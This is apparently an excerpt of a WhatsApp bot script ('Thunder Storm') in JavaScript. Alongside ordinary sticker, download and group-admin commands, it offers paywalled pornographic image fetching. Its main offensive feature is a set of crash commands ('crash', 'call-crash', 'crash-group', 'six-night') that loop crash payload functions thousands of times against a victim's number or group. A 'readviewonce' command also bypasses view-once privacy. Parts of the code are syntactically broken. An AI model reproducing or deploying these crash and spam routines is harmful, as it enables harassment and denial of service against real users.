const url = fs.readFileSync("./image/gen3.jpeg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: sock.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './image/gen3.jpeg' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'ZynzzDev',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[DEV SCRIPT]\`* 」
┣───────────────┈ 
┣=[ *\`[ ZynzzDev ]\`* ]==─
┆ • Jangan Chat Yang 18+
┆ • Jangan Call Owner 
┆ • Ada Kendala Chat No Cacicu
┆ • Gosah Caper
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Developer ThunderStorm V1 ( sock )","url":"https://t.me/Zynzz_Thunder","merchant_url":"https://t.me/Zynzz_Thunder"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './image/gen3.jpeg' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Saluran',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆「 *\`[CHANNEL OFC]\`* 」
┣───────────────┈ 
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Saluran Thunder Storm"https://whatsapp.com/channel/0029Vb5mcLAKWEKwNECQBR1l,"url":"channel/0029Vb5mcLAKWEKwNECQBR1l","merchant_url":"https://whatsapp.com/channel/0029Vb5mcLAKWEKwNECQBR1l"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await sock.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break;
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
			case 'r34': {
			if (!PremOnly) return ReplyRap("*You are not a Premium User*");	
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					sock.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image From Rapip\n\n*Powered By Rapip Ganteng*' }, { quoted: m })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
		case 'hentaineko':

if (!PremOnly) return ReplyRap("*You are not a Premium User*");
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
sock.sendMessage(m.chat, { caption: "sangean lu jir", image: { url:waifudd2.data.url } }, { quoted: m })
break
        	case 'nsfw': {
        	if (!PremOnly) return ReplyRap("*You are not a Premium User*");
        	ReplyRap(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			sock.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break

case 'x-storm':
case 'trava-storm': {
if (!PremOnly) return ReplyRap("*You are not a Premium User*");
    if (!q) return ReplyRap("Example .x-storm 628xxx");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRap(`Example: .trava-storm 628xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;
    
  sock.sendMessage(m.chat, {
  caption: "∆", 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "© Thunder Storm",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag', 
      buttonText: {
      displayText: 'Hidetag' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "ZynzzDev",
        "sections": [
            {
                "title": "Zynzz Dev",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "⎾𝐂𝐑͢͞˅𝐒̷𝐇🐉⏌",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟏༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                    },
                    {
                    header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟐༑",
                        "description": "✾",
                        "id": ".freeze ${isTarget}"
                    },
                    {
                    header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟑༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟒༑",
                        "description": "✾",
                        "id": ".overfloud ${isTarget}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟓༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                    },
                    {
                    "header": "⎾⌁⃰𝐈𝐧ͯ͢𝐅𝐌͠༑🐉⏌",
                        "title": "⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐌͠𝐨́˅͢𝐨𝐧༑",
                        "description": "✾",
                        "id": ".freeze ${isTarget}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐎̈́͢𝐋ͮ𝐒͠༑",
                        "description": "✾",
                        "id": ".overfloud ${isTarget}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐌͢𝐚̃˅͟𝐫𝐤༑",
                        "description": "✾",
                        "id": ".freeze ${isTarget}"
                    },
                    {
                    "header": "⎾⌁⃰𝐕͢𝐒𝐗༑🐉⏌",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐗༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐀༑",
                        "description": "✾",
                        "id": ".freeze ${isTarget}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐙༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝚯༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐒༑",
                        "description": "✾",
                        "id": ".instanttrash ${isTarget}"
                    },
                    {
                    "header": "⎾ 𝐈𝐨ͮ͢𝐒༑🐉⏌",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐆𝐥𝐢̶͢𝐜̾𝐡༑",
                        "description": "✾",
                        "id": ".bugios1 ${isTarget}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑",
                        "description": "✾",
                        "id": ".bugios2 ${isTarget}"
                    },
                    {
                    "header": "[ SPAMCALL ]",
                        "title": "⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐂𝐚̌͢𝐥𝐥༑",
                        "description": "✾",
                        "id": ".spamcall ${isTarget}"
                    },
                    {
                        header": "[ IOS ]",
                        "title": "⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝑽𝒊̷͢𝒅𝐂𝐚̌͢𝐥𝐥༑",
                        "description": "✾",
                        "id": ".spamcallvid ${isTarget}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break


// END ALL MENU CASE }

case 'addowner': case 'addown':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await sock.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRap(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./account/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero} succes rapipxxnxx to database!`);
  break;

//END
//ACCESS CASE

case 'delowner': case 'delown':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./account/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero2} succes delate to database!`);
  break;

//END
//ACCESS CASE

case 'addpremium': case 'addprem':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await sock.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRap(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero} succes rizkyy to database!`);
  break
  
//END
//ACCESS CASE


case 'delpremium': case 'delprem':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero2} succes delate to database!`);
  break;

//END
//QC CASE

case 'qc': {
  if (!q) return ReplyRap(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

//END
//PLAY CASE

case "play": {
        if (!qtext) return ReplyRap(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
      
//END
//RVO CASE

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return ReplyRap("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyRap("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyRap("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

//END
//SETPP CASE

case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return ReplyRap("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await ReplyRap("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await ReplyRap("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
//END
//DELETE PP CASE

case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  ReplyRap("Success Delete Profile Picture");
}
break;

//END
//TOVN CASE

case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return ReplyRap(`Reply media with caption ${prefix + command}`);
  if (!quoted) return ReplyRap(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

//END
//HIDETAG CASE

case 'hidetag': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  sock.sendMessage(from, { text: q ? q : 'Finix Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

//END
//KICK CASE

case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return ReplyRap("Send number / tag users ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;

//END
//GET LINK GROUP

case 'linkgroup': case 'linkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

//END
//RESET LINK GC CASE

case 'resetlinkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  sock.groupRevokeInvite(from);
}
break;

//END
//CONTROL CASE

case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  ReplyRap(`*Udah kepublic monyet*`);
}
break;

//END
//CONTROL CASE

case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  ReplyRap(`*Awokawok Mampus Udah Gw self*`);
}
break;

//END
//OCR CASE
case 'ocr': {

  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  if (!mime) return ReplyRap("Send / Reply Image");
  if (!/image\/(jpe?g|png)/.test(mime))
    return ReplyRap(`Tipe ${mime} tidak didukung!`);
  let image = await q.download();
  let download = await sock.getFile(image, true);
  let ocr = await ocrSpace(download.filename);
  await sock.sendMessage(
    m.chat,
    { text: ocr.ParsedResults[0].ParsedText.trim() },
    { quoted: m },
  );
}
break
//END
//TOURL CASE

case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyRap(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyRap('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyRap('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6');
    const uploadFile = require('./database/pusat/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyRap('Failed to upload media!');
    }

    sock.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: m });
}
break

//END
//STICKER CASE

case 'sticker': case 's': {
  if (!quoted) return ReplyRap(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyRap('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyRap(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
//END
//BRAT CASE
//rapipxxnxx BOT CASE

//END

case 'brat': {
            if (!q) return ReplyRap(`Send command with text. ${prefix + command} Rapippp`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break

//END
//TES BOT CASE
case 'tes':
case 'status': {
ReplyRap(`*Thunder Storm On Bosq!*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return m.reply(`woi, lu siapa?`)
if (!q) return m.reply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break
		
case 'tiktok': 
      case'tt':{
        if (!qtext) return ReplyRap(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await sock.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await sock.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await sock.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await sock.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await sock.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await sock.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return ReplyRap('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await sock.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break


//END
// CASE SPAM CALL
case 'six-night':{
if (!q) return ReplyRap("Example Use.\n six-night 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyRap(`𝐃𝐎𝐍𝐄 𝐌𝐀𝐓𝐈𝐈𝐍 𝐖𝐀 𝐍𝐘𝐀 𝐀𝐖𝐎𝐊𝐀𝐖𝐎𝐊😹`)
await sleep(10)
for (let i = 0; i < 2000; i++) {
await FcUi(target, wanted)
await InVisiLoc(target, wanted) 
await InVisiLocNull(target, wanted) 

}
}
break

case 'crash': {
if (!PremOnly) return ReplyRap(`sok asik dih dih modal makanya`)
if (!q) return ReplyRap("Example Use.\n crash 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyRap(`──♢ *LOADING*♢───
─♢ \`2000 CALL\` ♢──
ᴛʜᴇ ᴘʀᴏᴄᴇꜱꜱ ᴏꜰ ꜱᴇɴᴅɪɴɢ, 
ꜱᴏ ᴀꜱ ɴᴏᴛ ᴛᴏ ꜱᴘᴀᴍ ᴡʜɪʟᴇ 
*ᴛʜᴇ ʙᴏᴛ ɪꜱ ꜱᴛɪʟʟ ᴡᴏʀᴋɪɴɢ*
> Thunder`)
await sleep(1000)
for (let i = 0; i < 2000; i++) {
await FcUi(target, wanted) 
await InVisiLoc(target, wanted) 
await LocInvis(target, wanted)
}
}
break
// VERSION VIDEO

case 'p': case 'ytta': case 'dimana': case 'kiyomasa': {
    
   if (!PremOnly) return ReplyRap(`Only Prem!`)
    ReplyRap(`Sukses Spam Sender!`)
    {
    for (let i = 0; i < 115; i++) {
}
        }
    let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "Gilak Ati Ati di Lock"
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "storm",
        "sections": [
            {
                "title": "storm",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".rapip-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'night':{
if (!PremOnly) return ReplyRap(`sok asik dih dih modal makanya`)
if (!q) return ReplyRap("Example Use.\n night 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`𝐃𝐎𝐍𝐄 𝐌𝐀𝐓𝐈𝐈𝐍 𝐖𝐀 𝐍𝐘𝐀 𝐀𝐖𝐎𝐊𝐀𝐖𝐎𝐊😹`)
await sleep(1000)
for (let i = 0; i < 2000; i++) {
await FcUi(target, wanted) 
await InVisiLoc(target, wanted) 
}
}
break

//CASE BUG
case 'call-crash':{
if (!PremOnly) return ReplyRap(`sok asik dih dih modal makanya`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : call-crash 62xx_\nha`)
let isTarget = bijipler + '@s.whatsapp.net'
ReplyRap(`𝐃𝐎𝐍𝐄 𝐌𝐀𝐓𝐈𝐈𝐍 𝐖𝐀 𝐍𝐘𝐀 𝐀𝐖𝐎𝐊𝐀𝐖𝐎𝐊😹 ${isTarget}*`)
for (let i = 0; i < 2000; i++) {
await m.reply(`Gilak Ati Ati di Lock`)
await FcUi(target, wanted)

}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "Storm",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '𝐌𝐞𝐧𝐮'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.owner', 
      buttonText: {
      displayText: '𝐃𝐞𝐯'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.bugmenu', 
      buttonText: {
      displayText: '𝐁𝐮𝐠𝐌𝐞𝐧𝐮' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "storm",
        "sections": [
            {
                "title": "strom",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "bug one click ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐂𝐥𝐢𝐜𝐤",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "Storm ( no click )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐔𝐢",
                        "description": "⩟",
                        "id": ".killed-whatsapp"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐓𝐚𝐫𝐠𝐞𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "𝐂𝐫𝐚𝐬𝐡 𝐈𝐨𝐬",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case "blaka-group":
case "crash-group":
case "valhalla-group":
case "floid-gb":{
if (!DevOnly) return ReplyRap("Emang Lu Dev Gw Ha?");
ReplyRap(" command received ");
if (!q) return ReplyRap(`Example: \n ${prefix + command} https://chat.whatsapp.com/`
);
await sleep(1000);
ReplyRap(`Bot successfully sends a virus message`
);
let result = args[0].split("https://chat.whatsapp.com/")[1];
let isTarget = await sock.groupAcceptInvite(result);
for (let i = 0; i < 100; i++) {
await LocatiOn(target, wanted) 
await InVisiLoc(target, wanted) 
await LocInvis(target, wanted)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "storm",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
